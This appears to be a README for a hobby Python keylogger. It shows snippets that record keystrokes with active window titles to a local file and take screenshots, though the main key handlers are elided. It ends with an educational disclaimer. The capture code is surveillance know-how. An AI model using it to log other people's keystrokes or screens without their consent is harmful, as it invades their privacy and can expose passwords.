# Keylogger Project

This project implements a keylogger using Python that tracks keystrokes, takes screenshots, and logs active window titles. The keylogger records key presses and releases, while providing functionality to clear logs and take screenshots on demand.

## Features

- **Logging Keystrokes**: Records each key press and release along with the active window title.
- **Session Logging**: Summarizes key counts at the end of the session.
- **Clear Log Command**: Clears the log file when the '#' key is pressed.
- **Screenshot Functionality**: Takes a screenshot when the 'ESC' key is pressed.

## Requirements

- `pynput`: For listening to keyboard events.
- `Pillow`: For taking screenshots.
- `pywin32`: For interacting with Windows GUI.

## Installation

To install the required packages, use the following command:

```bash
pip install pynput Pillow pywin32
```
### Code Explanation
Importing Libraries
``` bash
import logging
import time
from pynput import keyboard
from datetime import datetime
import win32gui
import win32process
from PIL import ImageGrab
```
### Logging Configuration

``` bash
file_log = 'keyloggeroutput.txt'
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
```
This configures the logging to write to keyloggeroutput.txt.

### Active Window Retrieval
```bash 
def get_active_window():
    hwnd = win32gui.GetForegroundWindow()
    window_text = win32gui.GetWindowText(hwnd)
    return window_text
```
This function retrieves the title of the currently active window.

### Screenshot Functionality
```bash
def take_screenshot():
    img = ImageGrab.grab()
    img.save(f'screenshot_{int(time.time())}.png')
```
This function takes a screenshot and saves it with a timestamp.

### Key Mapping
```bash
key_mapping = {
    keyboard.Key.space: 'SPACE',
    keyboard.Key.enter: 'ENTER',
    keyboard.Key.tab: 'TAB',
    keyboard.Key.esc: 'ESC',
}
```
Defines a mapping for special keys to make the logs more readable.

### Clear Log Functionality
``` bash
def clear_log_file():
    with open(file_log, 'w') as log_file:
        log_file.write("")  # Clear the contents
```
Clears the log file when called.

### Key Press Event
``` bash
def on_press(key):
    ...
```
Handles key press events. If the '#' key is pressed, it clears the log file.
 It logs the key pressed along with the active window title, avoiding redundant entries.

### Key Release Event
```bash
def on_release(key):
    ...
```
Handles key release events and logs them. It also takes a screenshot when 'ESC' is released, stopping the listener.

### Starting the Key Logger
``` bash
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
This starts the keylogger listener.

### Session Summary
At the end of the session, a summary of key counts is logged:
```bash
with open(file_log, 'a') as log_file:
    log_file.write("\n=== Session Summary ===\n")
    for key, count in key_count.items():
        log_file.write(f'Key: {key}, Count: {count}\n')
```
### Usage
Run the script to start logging.
Use the ```'#'``` key to clear logs.
Press ```'ESC'``` to take a screenshot and stop the logging session.

### Disclaimer
This keylogger is for educational purposes only. Use responsibly and ensure compliance with legal regulations regarding privacy and consent.

